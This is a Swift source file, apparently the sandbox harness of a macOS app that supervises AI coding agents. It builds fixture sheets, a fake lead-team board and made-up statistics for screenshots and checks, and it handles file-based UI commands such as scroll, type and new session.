    /// `wallet STATE`'s sheets: a card per state, and all of them.
    static var walletSheets: [(name: String, make: (Driver) -> AnyView)] {
        walletCards.map { entry in
            ("wallet-" + entry.state, { _ in AnyView(WalletCard(card: entry.card).frame(width: 520).padding(16)) })
        } + [("wallet-all", { _ in
            AnyView(VStack(spacing: 12) { ForEach(walletCards, id: \.state) { WalletCard(card: $0.card) } }.frame(width: 520).padding(16))
        })]
    }

    /// AppKit windows `sheet NAME` shows too: the question for a chosen folder in no repository (a scratch folder under
    /// the sandbox's home, with a .gitignore of its own that misses its secret-named files).
    static var windowSheets: [(name: String, make: (Driver) -> NSWindow?)] { [
        ("not-repository", { driver in
            let folder = driver.home + "/projects/notes-app"
            try? VibePaths.ensurePrivate(URL(fileURLWithPath: folder + "/src"))
            for (name, text) in [("README.md", "# Notes\n"), ("src/main.py", "print('hi')\n"), (".gitignore", "*.log\n"),
                                 (".env", "TOKEN=x\n"), ("server.pem", "-\n")] {
                try? VibePaths.writePrivate(Data(text.utf8), to: URL(fileURLWithPath: folder + "/" + name))
            }
            let scratch = URL(fileURLWithPath: driver.home + "/scratch")
            guard case .success(let plan) = FolderRepository.plan(for: folder, scratch: scratch) else { return nil }
            let alert = ProjectFolderStart.notRepositoryAlert(plan)
            alert.layout()
            return alert.window
        }),
        // A repository with no commits yet, staged file and all: the first commit LeadController offers.
        ("empty-repository", { driver in
            let folder = driver.home + "/projects/empty-repo"
            try? VibePaths.ensurePrivate(URL(fileURLWithPath: folder + "/src"))
            for (name, text) in [("README.md", "# Empty\n"), ("src/main.swift", "print(1)\n"), ("deploy.key", "-\n")] {
                try? VibePaths.writePrivate(Data(text.utf8), to: URL(fileURLWithPath: folder + "/" + name))
            }
            guard Git.run(["init", "--quiet"], in: folder).ok, Git.run(["add", "README.md"], in: folder).ok else { return nil }
            let scratch = URL(fileURLWithPath: driver.home + "/scratch")
            guard case .success(let plan) = FolderRepository.plan(for: folder, scratch: scratch) else { return nil }
            let alert = ProjectFolderStart.emptyRepositoryAlert(plan)
            alert.layout()
            return alert.window
        }),
        // A lead started on a Mac without Claude Code: the real look (`LaunchPreflight`), its login shell a stand-in
        // whose PATH has no claude, and the alert the start shows, offering Anthropic's installer (`ToolInstall`).
        ("missing-claude", { driver in
            let shell = driver.home + "/bin/fakesh"
            let script = "#!/bin/sh\nshift 2\nPATH=/usr/bin:/bin; export PATH\nexec /bin/sh \"$@\"\n"
            try? VibePaths.ensurePrivate(URL(fileURLWithPath: driver.home + "/bin"))
            try? VibePaths.writePrivate(Data(script.utf8), to: URL(fileURLWithPath: shell))
            chmod(shell, 0o700)
            guard let missing = LaunchPreflight(shell: shell).check(command: "claude"), let install = ToolInstall.offer(for: missing)
            else { return nil }
            let offer = install.offer(missing)
            let alert = LeadController.makeAlert(offer.title, offer.text, ToolInstall.buttons)
            alert.layout()
            return alert.window
        }),
        // A lead started on a Mac without Apple's Command Line Tools (nor git with them): the install it offers.
        ("missing-tools", { _ in
            let missing = LaunchPreflight.Problem(missing: [.commandLineTools])
            let offer = ToolInstall.commandLineTools.offer(missing)
            let alert = LeadController.makeAlert(offer.title, offer.text, ToolInstall.buttons)
            alert.layout()
            return alert.window
        }),
        // What shows while Apple's installer runs.
        ("installing-tools", { _ in ToolInstaller.waitingPanel(ToolInstaller.waitingText) {} }),
    ] }

    /// The `lead-team` sheet's board, as of now.
    static func leadTeam() -> (board: LeadBoard, seen: [String: MemberSeen], decisions: [LeadDecision]) {
        let now = Date().timeIntervalSince1970
        var board = LeadBoard()
        func task(_ title: String, _ status: LeadTask.Status, since: Double) -> LeadTask {
            var task = LeadTask(slug: Slug.make(title, taken: []), title: title,
                                contract: LeadContract(goal: title, acceptance: [], boundaries: [], context: ""), status: status)
            task.createdAt = now - 7_200
            task.since = now - since
            if status != .planned { task.worker = UUID().uuidString; task.worktree = "/tmp/\(task.slug)" }
            return task
        }
        var working = task("Payout ledger reconciles nightly", .running, since: 4 * 60)
        working.checkpoints = [LeadCheckpoint(text: "Ledger diff written; running the reconciliation tests", at: now - 120)]
        var after = task("Payout report shows reconciled totals", .blocked, since: 18 * 60)
        after.after = [working.slug]
        let unsaid = task("Stake history pages load under a second", .blocked, since: 18 * 60)
        var merged = (1...4).map { index -> LeadTask in
            var done = task("Merged task \(index)", .done, since: Double(index) * 3_000)
            done.worktree = nil
            done.merged = LeadMergeRecord(commit: "abc\(index)def0", tested: true, audited: index == 1 ? nil : false, at: now - Double(index) * 3_000)
            done.review = index == 1 ? .audit : LeadTask.Review.none
            done.receipt = Driver.receipt(worked: Double(index) * 1_500, opus: index * 900_000, fable: index == 1 ? 2_400_000 : nil, end: now - Double(index) * 3_000)
            return done
        }
        var audits = LeadAuditLedger()
        audits.rounds = 6
        audits.passed = true
        merged[0].audits = audits
        var abandoned = task("Old staking widget", .abandoned, since: 9_000)
        abandoned.abandonedBecause = "Replaced by the payout report."
        // auto_advance audited it again once after its verifier's agent quit; the retry's verifier ended too.
        var twice = task("Attention badge from stored scans", .review, since: 25 * 60)
        twice.review = .audit
        let verifier = UUID().uuidString
        twice.verifier = verifier
        twice.verifierRetry = LeadVerifierRetry(commit: "abc1234def0", first: LeadWitness.agentQuitEnding, verifiers: [verifier], second: "killed by SIGTERM")
        var reverted = task("Paste images into the chat", .reverted, since: 4_000)
        reverted.worktree = nil
        reverted.merged = LeadMergeRecord(commit: "abc9def0", tested: true, onto: "abc8def0", audited: false, at: now - 6_000)
        reverted.merged?.revertedBy = "fed9cba0"
        reverted.merged?.revertReason = "The chat froze on a large paste; reverted, a fix-forward is planned."
        // Review none, raised to audit by the risk check (see `LeadRisk`) when its worker reported done.
        var raised = task("Clean up ended sessions' folders", .review, since: 2 * 60)
        raised.review = .audit
        raised.riskRaised = LeadRiskRaise(reason: "it has code that deletes or rewrites files or data (Sources/Cleanup.swift: try fm.removeItem(at: folder))",
                                          commit: "abc1234def0", byModel: false)
        board.tasks = merged + [working, after, unsaid, twice, raised, reverted, abandoned]

        var withdrawn = LeadQuestion(text: "Sidebar review found three overlapping rows. Re-plan the sidebar as one task, or fix each row on its own?\nThe review's notes are in progress.md.",
                                     options: ["One task", "Each row"], at: now - 1_500)
        withdrawn.withdrawnAt = now - 600
        withdrawn.withdrawReason = "User asked to re-ask it. Sidebar review found the rows were one bug."
        var answered: [LeadQuestion] = []
        for (index, (text, answer)) in [("Which payout fixes go first: 1 the rounding, 2 the late cron, 3 the stale cache?\nEach is a task of its own; 1 and 3 touch the same file.", "1 and 3"),
                                        ("The ledger can be fixed now (C) or redesigned (B). C now and plan B as its own task, or B only?", "C now + plan B as its own task"),
                                        ("Keep the old CSV export?", "Yes, for a month"),
                                        ("Run the reconciliation at 02:00 or 04:00 UTC?", "04:00"),
                                        ("Merge the stake history work with no audit (review none)?", "Yes")].enumerated() {
            var question = LeadQuestion(text: text, options: [], at: now - Double(index + 1) * 2_400)
            question.answer = answer
            question.answeredAt = question.askedAt + 300
            answered.append(question)
        }
        board.questions = answered.reversed() + [withdrawn]
        board.refreshScores(now: now)

        var seen: [String: MemberSeen] = [:]
        seen[working.worker!] = MemberSeen(live: true, needsYou: false, working: true, activity: "Running swift test", since: Date(timeIntervalSince1970: now - 60),
                                           startedAt: Date(timeIntervalSince1970: now - 240))
        seen[verifier] = MemberSeen(live: false, needsYou: false, working: false, activity: nil, since: nil, startedAt: Date(timeIntervalSince1970: now - 900))
        let decisions = (1...16).map { LeadDecision(at: now - Double($0) * 900, text: "Earlier decision \($0)", why: "") }
        return (board, seen, decisions)
    }

    /// A merged task's receipt: `opus` tokens of its worker's (mostly cache reads, as a worker's are), `fable` of its
    /// verifier's.
    static func receipt(worked: Double, opus: Int, fable: Int?, end: Double) -> LeadReceipt {
        func tokens(_ total: Int, _ model: String) -> LeadTokens {
            let read = total * 9 / 10, write = total / 20, output = total / 50
            var tokens = LeadTokens(input: total - read - write - output, output: output, cacheRead: read, cacheWrite: write, cacheWrite1h: write,
                                    sessions: 1, models: [model])
            let price = LeadPrices.price(model)!
            tokens.cost = (Double(tokens.input) * price.input + Double(output) * price.output + Double(read) * price.cacheRead
                           + Double(write) * price.input * 2) / 1_000_000
            return tokens
        }
        return LeadReceipt(ending: .merged, startedAt: end - worked * 1.6, endedAt: end, worked: worked, worker: tokens(opus, "claude-opus-5-5"),
                           verifier: fable.map { tokens($0, "claude-fable-5-1") }, rounds: fable == nil ? 0 : 1, tests: 1_412)
    }

    /// The `statistics` sheet's stats: made up, for `range`.
    static func statistics(range: DateInterval) -> SetupStats {
        let now = Date().timeIntervalSince1970
        func figures(merged: Int, abandoned: Int, audited: Int, rounds: Int, flakes: Int?, hours: Double, cost: Double, costed: Int,
                     codex: Int, claude: Int, minutes: [Double]) -> ProjectFigures {
            var f = ProjectFigures()
            (f.merged, f.abandoned, f.audited, f.auditRounds) = (merged, abandoned, audited, rounds)
            f.flakes = flakes.map { ProjectFigures.Flakes.make(flakes: $0, tests: $0, merges: max(1, $0 - 1)) }
            (f.workerHours, f.cost, f.costed, f.ended) = (hours, cost, costed, codex + claude)
            (f.codexTasks, f.claudeTasks) = (codex, claude)
            f.startToMerge = minutes.map { $0 * 60 }
            return f
        }
        let payouts = figures(merged: 14, abandoned: 1, audited: 9, rounds: 13, flakes: 3, hours: 31.5, cost: 182.4, costed: 15,
                              codex: 4, claude: 11, minutes: [48, 72, 95, 130, 61])
        let site = figures(merged: 6, abandoned: 0, audited: 2, rounds: 2, flakes: nil, hours: 9.25, cost: 41.1, costed: 5,
                           codex: 3, claude: 3, minutes: [35, 52, 44])
        let projects = [SetupStats.Project.make(name: "example-payouts", root: "/example/payouts", hasArchive: true, figures: payouts),
                        SetupStats.Project.make(name: "example-site", root: "/example/site", hasArchive: false, figures: site),
                        SetupStats.Project.make(name: "example-old", root: "/example/old", hasArchive: true, figures: nil)]
        let mac = SetupStats.MacWide.make(
            load: LoadProfile.make(minutes: 9_840, median: 9.4, p90: 22.8, max: 41.2, minutesAt24: 610, minutesAt36: 42, cores: 14),
            merges: MergeRate.make(recorded: 23, landed: 20, hours: 164),
            freezes: statisticsFreezes(range: range),
            hoursBoosted: 38.5,
            boostNow: BoostState(on: true, why: "automatic: away, on AC", at: now),
            claude: [UsageNow.make(name: "seven_day", model: nil, usedPercent: 64, resetsAt: now + 3.4 * 86_400, reached: false,
                              pace: UsagePace(used: 64, elapsed: 52)),
                     UsageNow.make(name: "five_hour", model: nil, usedPercent: 18, resetsAt: now + 2 * 3_600, reached: false,
                              pace: UsagePace(used: 18, elapsed: 60))],
            codex: [UsageNow.make(name: "weekly", model: nil, usedPercent: 31, resetsAt: nil, reached: false, pace: UsagePace(used: 31, elapsed: nil))])
        return SetupStats.make(range: range, at: Date(), projects: projects, total: payouts.adding(site), mac: mac,
                               quality: statisticsQuality(range: range))
    }

    /// The `statistics` sheet's freezes: made up, a falling daily trend over the range's days, today half gone.
    static func statisticsFreezes(range: DateInterval) -> Freezes {
        let calendar = Calendar.current
        let counts = [96, 88, 120, 75, 41, 12, 5]
        var days: [Freezes.Day] = []
        var day = calendar.startOfDay(for: range.start)
        while day < range.end, days.count < 31, let next = calendar.date(byAdding: .day, value: 1, to: day) {
            let parts = calendar.dateComponents([.year, .month, .day], from: day)
            let last = next >= range.end
            let count = counts[days.count % counts.count]
            days.append(Freezes.Day(day: String(format: "%04d-%02d-%02d", parts.year ?? 0, parts.month ?? 0, parts.day ?? 0),
                                    freezes: last ? count / 2 : count, hours: last ? 12 : 24))
            day = next
        }
        return Freezes.make(count: days.reduce(0) { $0 + $1.freezes }, hours: days.reduce(0) { $0 + $1.hours }, partial: false,
                            perDay: [:], byLoad: nil, unsampled: 0, days: days)
    }

    /// The `statistics` sheet's quality figures: made up, every figure shown; the merge reruns' cost, Codex's cost per
    /// task and its process cost not recorded (its tokens have no price).
    static func statisticsQuality(range: DateInterval) -> SetupQuality {
        func figures(merged: Int, audited: Int, firstPass: Int, rounds: Int, important: Int, firstTry: Int?, rerolls: Int, reverts: Int,
                     escapes: Int, questions: Int, waitMinutes: Double, nobody: Int, hours: [Double], worked: Double, cost: (Double, Double)?) -> QualityFigures {
            var f = QualityFigures()
            f.merged = merged
            f.audited = audited
            f.firstAuditPassRate = audited > 0 ? Double(firstPass) / Double(audited) : nil
            f.meanRoundsToPass = audited > 0 ? Double(rounds) / Double(audited) : nil
            f.importantFindings = important
            f.findings = FindingOutcomes(fixed: important + 3, disagreementAccepted: 2, dismissedByVerifier: 1, dismissedByLead: 1,
                                         movedToTask: 1, leftOpen: 4, important: important)
            f.mergeFirstTry = firstTry.map { MergeFirstTry(counted: merged, firstTry: $0) }
            (f.rerolls, f.reverts, f.escapes) = (rerolls, reverts, escapes)
            f.questions = questions
            f.userMinutesPerMergedTask = waitMinutes / Double(merged)
            f.neededNobody = nobody
            f.createdToMerged = hours.map { $0 * 3600 }
            f.timed = hours.count
            f.timedSpan = hours.reduce(0, +) * 3600
            f.timedWorked = worked * 3600
            f.workerHours = worked * 1.2
            f.busyHours = worked * 0.45
            if let (worker, verifier) = cost {
                (f.costed, f.workerCost, f.verifierCost, f.cost) = (merged, worker, verifier, worker + verifier)
            }
            return f
        }
        var claude = figures(merged: 13, audited: 9, firstPass: 6, rounds: 13, important: 7, firstTry: 11, rerolls: 1, reverts: 1, escapes: 1,
                             questions: 5, waitMinutes: 38, nobody: 8, hours: [1.2, 1.9, 2.4, 3.1, 0.9, 1.5, 6.2, 2.2, 1.1, 2.8, 4.0, 1.7, 2.0],
                             worked: 11.5, cost: (121.6, 38.9))
        var codex = figures(merged: 7, audited: 7, firstPass: 3, rounds: 12, important: 6, firstTry: 5, rerolls: 1, reverts: 0, escapes: 1,
                            questions: 2, waitMinutes: 9, nobody: 4, hours: [1.4, 2.9, 3.3, 1.8, 2.6, 5.1, 2.0], worked: 6.2, cost: nil)
        let fable = figures(merged: 3, audited: 3, firstPass: 3, rounds: 3, important: 1, firstTry: 3, rerolls: 0, reverts: 0, escapes: 0,
                            questions: 1, waitMinutes: 6, nobody: 2, hours: [3.1, 4.0, 6.2], worked: 5.0, cost: (61.2, 12.4))
        let opus = figures(merged: 7, audited: 5, firstPass: 3, rounds: 8, important: 5, firstTry: 6, rerolls: 1, reverts: 1, escapes: 1,
                           questions: 3, waitMinutes: 25, nobody: 4, hours: [1.2, 1.9, 2.4, 2.2, 2.8, 1.7, 2.0], worked: 5.2, cost: (52.3, 21.5))
        let sonnet = figures(merged: 3, audited: 1, firstPass: 0, rounds: 2, important: 1, firstTry: 2, rerolls: 0, reverts: 0, escapes: 0,
                             questions: 1, waitMinutes: 7, nobody: 2, hours: [0.9, 1.5, 1.1], worked: 1.3, cost: (8.1, 5.0))
        var all = figures(merged: 20, audited: 16, firstPass: 9, rounds: 25, important: 13, firstTry: 16, rerolls: 2, reverts: 1, escapes: 2,
                          questions: 9, waitMinutes: 52, nobody: 12, hours: claude.createdToMerged.map { $0 / 3600 } + codex.createdToMerged.map { $0 / 3600 },
                          worked: 17.7, cost: (121.6, 38.9))
        all.costed = 13
        // What the comparison with working solo and the new records add: Claude's merges in the solo baseline but one
        // re-rolled, Codex's left out (no price), the lead's spend in All.
        func solo(_ f: inout QualityFigures, merges: Int, worker: Double, verifier: Double, reran: Int, rerolled: Int, codex: Int?,
                  fixed: Int, sentBack: Int, flakes: Int, incidents: Int, waited: Double, verifierHours: Double) {
            (f.soloMerges, f.soloWorkerCost, f.soloVerifierCost, f.soloReran, f.rerolledLeftOut) = (merges, worker, verifier, reran, rerolled)
            if let codex { (f.codexLeftOut, f.codexTokens) = (f.merged, codex) }
            (f.auditsKept, f.importantFixed, f.sentBack, f.flakesCaught) = (f.audited, fixed, sentBack, flakes)
            f.incidents = incidents
            (f.waited, f.waitedSpan, f.auditWaited) = (f.timed, f.timedSpan, f.timedSpan * waited)
            f.verifierHours = verifierHours
        }
        solo(&claude, merges: 12, worker: 112.4, verifier: 36.1, reran: 1, rerolled: 1, codex: nil, fixed: 5, sentBack: 2, flakes: 2, incidents: 1,
             waited: 0.12, verifierHours: 6.8)
        solo(&codex, merges: 0, worker: 0, verifier: 0, reran: 0, rerolled: 0, codex: 4_800_000, fixed: 4, sentBack: 1, flakes: 1, incidents: 1,
             waited: 0.18, verifierHours: 4.1)
        solo(&all, merges: 12, worker: 112.4, verifier: 36.1, reran: 1, rerolled: 1, codex: 4_800_000, fixed: 9, sentBack: 3, flakes: 3, incidents: 2,
             waited: 0.14, verifierHours: 10.9)
        all.codexLeftOut = 7
        all.lead = LeadSpend(tokens: 41_200_000, cost: 27.3, unpricedDays: 0)
        // The audit sample's audits of review none, and the audits split by whether the verifier ran on the worker's model.
        (all.sampledAudits, all.sampledImportant) = (4, 1)
        (all.sameModelAudited, all.sameModelImportant, all.otherModelAudited, all.otherModelImportant) = (5, 3, 11, 10)
        let passes: [Double?] = [nil, 0.4, 0.5, 0.45, 0.6, 0.55, 0.62, 0.56]
        let costs: [Double?] = [nil, 14.2, 12.9, 13.6, 11.4, 12.2, 10.8, 12.4]
        let weeks = (0..<8).map { index -> QualityWeek in
            let end = range.end.addingTimeInterval(-Double(7 - index) * 7 * 86_400)
            return QualityWeek(start: end.addingTimeInterval(-7 * 86_400), end: end, merged: index == 0 ? 0 : 8 + index * 2,
                               firstAuditPassRate: passes[index], costPerMergedTask: costs[index])
        }
        return SetupQuality(all: all, byAgent: [QualityGroup(name: "Claude", figures: claude), QualityGroup(name: "Codex", figures: codex)],
                            byModel: [QualityGroup(name: "fable", figures: fable), QualityGroup(name: "opus", figures: opus),
                                      QualityGroup(name: "sonnet", figures: sonnet)],
                            weeks: weeks, scorecard: sandboxScorecard(range))
    }

    /// The scorecard's two weeks: this week with n ≥ 10 merges (a trend said), the week before with fewer (none said).
    static func sandboxScorecard(_ range: DateInterval) -> SetupScorecard {
        let end = range.end, day = 86_400.0
        var week = ScorecardWeek(start: end.addingTimeInterval(-7 * day), end: end)
        week.origins = LeadOrigins(counts: [.userReport: 3, .audit: 4, .incident: 1, .flake: 1, .lead: 5], unsaid: 2)
        (week.merged, week.questions, week.userMinutes) = (12, 5, 64)
        (week.costed, week.cost) = (11, 112.4)
        (week.leadSpread, week.leadUnspread, week.leadKept) = (22.1, 5.2, true)
        week.installTimes = [5.2, 7.9, 26, 3.1, 9.4, 30.5, 12, 6.6, 4.4, 18].map { $0 * 3600 }
        week.notInstalled = 2
        var previous = ScorecardWeek(start: end.addingTimeInterval(-14 * day), end: end.addingTimeInterval(-7 * day))
        previous.origins = LeadOrigins(counts: [.userReport: 5, .audit: 2], unsaid: 1)
        (previous.merged, previous.questions, previous.userMinutes) = (8, 6, 70)
        (previous.costed, previous.cost) = (8, 96)
        (previous.leadSpread, previous.leadKept) = (18, true)
        previous.installTimes = [8, 20, 31, 6, 11, 9, 14, 22].map { $0 * 3600 }
        let now = end.timeIntervalSince1970 - day / 2
        let titles = ["Paste images into the chat", "Clean up ended sessions' folders", "Price Codex tokens", "Scorecard in Statistics"]
        let installs = titles.enumerated().map { index, title in
            ScorecardInstall(slug: "task-\(index)", title: title, createdAt: now - Double(index + 1) * day, mergedAt: now - Double(index + 1) * day + 4 * 3600,
                             installedAt: index == 0 ? nil : now - Double(index + 1) * day + Double(5 + index) * 3600)
        }
        return SetupScorecard(week: week, previous: previous, installs: installs)
    }

    /// The `all-done` sheet's mark: a batch of four, three merged with receipts and one folded.
    static func allDoneMark() -> LeadAllDone {
        let now = Date().timeIntervalSince1970
        let made: [(String, String, LeadAllDone.Task.Outcome, LeadReceipt?)] = [
            ("payout-ledger", "Payout ledger reconciles nightly", .merged, receipt(worked: 5_400, opus: 14_800_000, fable: 3_100_000, end: now - 900)),
            ("payout-report", "Payout report shows reconciled totals", .merged, receipt(worked: 2_700, opus: 6_200_000, fable: nil, end: now - 600)),
            ("stake-history", "Stake history pages load under a second", .merged, receipt(worked: 1_800, opus: 4_100_000, fable: nil, end: now - 300)),
            ("old-widget", "Old staking widget", .folded, nil),
        ]
        var tasks: [LeadTask] = []
        for (slug, title, _, receipt) in made {
            var task = LeadTask(slug: slug, title: title, contract: LeadContract(goal: title, acceptance: [], boundaries: [], context: ""), status: .done)
            task.receipt = receipt
            tasks.append(task)
        }
        var mark = LeadAllDone(id: "sandbox-all-done", at: now - 60, since: now - 4 * 3_600, tasks: made.map { .init(slug: $0.0, title: $0.1, outcome: $0.2) })
        mark.summary = .init(headline: "Payouts now reconcile every night, and the stake history loads fast.", bullets: [
            "The payout ledger is checked against the bank's records each night, and the report shows the reconciled totals.",
            "Stake history pages load in under a second.",
        ], byModel: true)
        mark.receipts = LeadReceiptTotals(tasks)
        return mark
    }

    /// Two updates for the `results` sheet, their images in a scratch project under the sandbox's home.
    static func results(home: String) -> [LeadUpdate] {
        let project = home + "/projects/results", worktree = project + "/.vibeswitcher/worktrees/shots-a"
        let shot = worktree + "/.build/sandbox-shots/board.png"
        let symbol = NSImage(systemSymbolName: "checkmark.seal.fill", accessibilityDescription: "Done")?
            .withSymbolConfiguration(.init(pointSize: 96, weight: .regular))
        if let tiff = symbol?.tiffRepresentation, let png = NSBitmapImageRep(data: tiff)?.representation(using: .png, properties: [:]) {
            try? VibePaths.ensurePrivate(URL(fileURLWithPath: (shot as NSString).deletingLastPathComponent))
            try? VibePaths.writePrivate(png, to: URL(fileURLWithPath: shot))
        }
        var kept = LeadUpdate(title: "Board shows the done card", body: "Checked in the sandbox; the screenshot is a kept copy.")
        kept.images = (try? KeptImages(folder: project + "/.vibeswitcher").keep([shot], as: "updates/\(kept.id)", relativeTo: project)) ?? []
        try? FileManager.default.removeItem(atPath: worktree)
        var gone = LeadUpdate(title: "Older result", body: "Posted before images were kept: its screenshot was in a worktree since cleaned up.",
                              images: [worktree + "/.build/all-done-snapshots/card.png"])
        gone.at = kept.at - 600
        return [gone, kept]
    }

    private func listen() {
        let timer = DispatchSource.makeTimerSource(queue: .main)
        timer.schedule(deadline: .now() + 0.1, repeating: 0.1)
        timer.setEventHandler { [weak self] in self?.takeRequests() }
        timer.resume()
        poller = timer
    }

    private var answering: Set<String> = []

    private func takeRequests() {
        guard ready, let names = try? FileManager.default.contentsOfDirectory(atPath: control.path) else { return }
        for name in names.sorted() where name.hasPrefix("req-") && !answering.contains(name) {
            let file = control.appendingPathComponent(name)
            guard let data = try? Data(contentsOf: file) else { continue }
            try? FileManager.default.removeItem(at: file)
            let id = String(name.dropFirst("req-".count))
            answering.insert(name)
            let words = data.split(separator: 0, omittingEmptySubsequences: false).map { String(decoding: $0, as: UTF8.self) }
                .filter { !$0.isEmpty }
            Breadcrumbs.shared.note("sandbox: asked \(words.first ?? "nothing")")
            Sandbox.doing = words.first ?? ""
            handle(words) { [weak self] ok, text in
                guard let self else { return }
                self.answering.remove(name)
                let reply = (ok ? "ok\n" : "error\n") + text + (text.hasSuffix("\n") || text.isEmpty ? "" : "\n")
                try? VibePaths.writePrivate(Data(reply.utf8), to: self.control.appendingPathComponent("rep-\(id)"))
            }
        }
    }

    private func handle(_ words: [String], reply: @escaping (Bool, String) -> Void) {
        let rest = words.dropFirst().joined(separator: " ")
        switch words.first ?? "" {
        case "status": reply(true, status())
        case "views": reply(true, views())
        case "board":
            // The fake lead's board grown by N finished tasks (a day's worth of a busy lead's), each with a contract.
            let count = max(1, Int(rest) ?? 250)
            let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
            let contract = LeadContract(goal: "A finished sandbox task, its goal as long as a real one's: what changes, where, and how it's checked.",
                                        acceptance: ["It shows."], boundaries: [], context: "")
            do {
                try BoardStore(root: root).update { board in
                    let start = board.tasks.count
                    for index in start..<(start + count) {
                        var task = LeadTask(slug: "finished-\(index)", title: "Finished task \(index) of the sandbox lead", contract: contract,
                                            status: index % 9 == 0 ? .abandoned : .done)
                        task.since = Date().timeIntervalSince1970 - Double(count - index) * 60
                        board.tasks.append(task)
                    }
                }
            } catch {
                return reply(false, "couldn't write the lead's board: \(error)")
            }
            leads.refresh()
            settle { reply(true, "\(count) finished tasks added to the lead's board") }
        case "churn":
            // The fake lead's board changing N times, 0.15 s apart (a checkpoint each, as a busy team's do), each read
            // and shown the way a real change is (`LeadController.refresh`): `hangs` then says what it cost.
            let count = max(1, Int(rest) ?? 40)
            let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
            func step(_ index: Int) {
                guard index < count else { return settle { reply(true, "board changed \(count) times") } }
                try? BoardStore(root: root).update { board in
                    guard let at = board.tasks.firstIndex(where: { $0.status == .running }) else { return }
                    board.tasks[at].checkpoints = (board.tasks[at].checkpoints ?? []) + [LeadCheckpoint(text: "Checkpoint \(index)")]
                }
                leads.refresh()
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.15) { step(index + 1) }
            }
            step(0)
        case "publish":
            // The lead controller publishing N times (a board changed), each laid out and drawn: what one costs the
            // window with the chat shown.
            guard let shown = window?.window else { return reply(false, "no window") }
            let count = max(1, Int(rest) ?? 50)
            var longest = 0.0
            let started = Date()
            for _ in 0..<count {
                let at = Date()
                leads.objectWillChange.send()
                RunLoop.main.run(mode: .default, before: Date())
                shown.contentView?.layoutSubtreeIfNeeded()
                shown.displayIfNeeded()
                longest = max(longest, Date().timeIntervalSince(at))
            }
            let total = Date().timeIntervalSince(started)
            reply(true, String(format: "%d publishes: %.1f ms each, longest %.1f ms", count, total * 1000 / Double(count), longest * 1000))
        case "scroll" where rest.hasPrefix("settings"):
            // The shown category's form: the window's widest scroll view (the sidebar's list is narrower).
            func scrolls(_ view: NSView) -> [NSScrollView] { ((view as? NSScrollView).map { [$0] } ?? []) + view.subviews.flatMap(scrolls) }
            guard let root = settings?.window?.contentView, let scroll = scrolls(root).max(by: { $0.frame.width < $1.frame.width }),
                  let document = scroll.documentView else {
                return reply(false, "no settings shown")
            }
            let to = rest.dropFirst("settings".count).trimmingCharacters(in: .whitespaces)
            let height = document.frame.height - scroll.contentSize.height
            // A fraction (0.4) scrolls that far down.
            let y: CGFloat = Double(to).map { height * CGFloat(min(1, max(0, $0))) } ?? (to == "top" ? 0 : to == "middle" ? height / 2 : height)
            scroll.contentView.scroll(to: NSPoint(x: 0, y: max(0, y)))
            scroll.reflectScrolledClipView(scroll.contentView)
            settle { reply(true, "scrolled settings to \(Int(y)) of \(Int(height))") }
        case "scroll":
            // The chat's scroll view: the one holding its messages.
            func holdsChat(_ view: NSView) -> Bool { view is ChatTextView || view.subviews.contains(where: holdsChat) }
            func find(_ view: NSView) -> NSScrollView? {
                if let scroll = view as? NSScrollView, let document = scroll.documentView, holdsChat(document) { return scroll }
                return view.subviews.lazy.compactMap(find).first
            }
            guard let root = window?.window?.contentView, let scroll = find(root), let document = scroll.documentView else {
                return reply(false, "no chat shown")
            }
            let height = document.frame.height - scroll.contentSize.height
            let y = rest == "top" ? 0 : rest == "middle" ? height / 2 : height
            scroll.contentView.scroll(to: NSPoint(x: 0, y: max(0, y)))
            scroll.reflectScrolledClipView(scroll.contentView)
            settle { reply(true, "scrolled to \(Int(y)) of \(Int(height))") }
        case "size":
            let parts = rest.split(separator: "x").compactMap { Double($0) }
            guard parts.count == 2, let shown = window?.window else { return reply(false, "size WIDTHxHEIGHT") }
            shown.setContentSize(NSSize(width: parts[0], height: parts[1]))
            settle { reply(true, "window \(Int(parts[0]))×\(Int(parts[1]))") }
        case "chat": chat(rest, reply)
        case "terminal":
            model.showsChat = false
            reply(true, "terminal shown")
        case "drag": dragInTerminal(Set(words.dropFirst()), reply)
        case "copy": pressMenuKey("c", reply)
        case "paste":
            NSPasteboard.general.clearContents()
            NSPasteboard.general.setString(rest, forType: .string)
            pressMenuKey("v", reply)
        case "mouse": mouseReporting(rest == "on", reply)
        case "keys":
            // Typed into the shown terminal, then Return, as the keyboard sends them (a sandbox session only: they all are).
            guard let (terminal, _) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
            terminal.send(txt: rest + "\r")
            settle { reply(true, "typed \(rest.count) characters and Return\n\(self.terminalState(terminal))") }
        case "type":
            guard let composer = composer() else { return reply(false, "no composer: show a fake session's chat first (chat)") }
            composer.window?.makeFirstResponder(composer)
            composer.insertText(rest, replacementRange: composer.selectedRange())
            reply(true, "typed \(rest.count) characters")
        case "send":
            guard let composer = composer() else { return reply(false, "no composer: show a fake session's chat first (chat)") }
            composer.window?.makeFirstResponder(composer)
            composer.doCommand(by: #selector(NSResponder.insertNewline(_:)))
            reply(true, "sent")
        case "tell": tell(rest, reply)
        case "notify": notify(rest, reply)
        case "runblock": runBlock(confirmed: rest == "yes", reply)
        case "clear":
            // Ended first, then removed (the host keeps an ended session's row until it's removed).
            let ids = host.sessions.map(\.id)
            ids.forEach(host.kill)
            waitFor({ [weak self] in self?.host.sessions.allSatisfy { !$0.isLive } ?? true }) { [weak self] _ in
                guard let self else { return }
                for id in ids { self.window?.pane.forget(id); self.host.remove(id) }
                self.waitFor({ self.host.sessions.isEmpty && self.store.sessions.isEmpty }) { cleared in
                    self.settle { reply(cleared, cleared ? "cleared: no sessions" : "sessions left: \(self.host.sessions.count)") }
                }
            }
        case "new":
            // "new codex LABEL", "new shell LABEL" and "new zsh LABEL": a Codex row, a plain shell's (`cat`), a real zsh's.
            let words = rest.split(separator: " ", maxSplits: 1).map(String.init)
            if words.first == "zsh" {
                let label = words.dropFirst().joined()
                return startFake(label: label.isEmpty ? "Scratch zsh \(fakeCount + 1)" : label, agent: nil, zsh: true) { problem in
                    reply(problem == nil, problem ?? "started")
                }
            }
            let kinded = words.first == "codex" || words.first == "shell"
            let agent: Agent? = words.first == "shell" ? nil : words.first == "codex" ? .codex : .claude
            let label = kinded ? words.dropFirst().joined() : rest
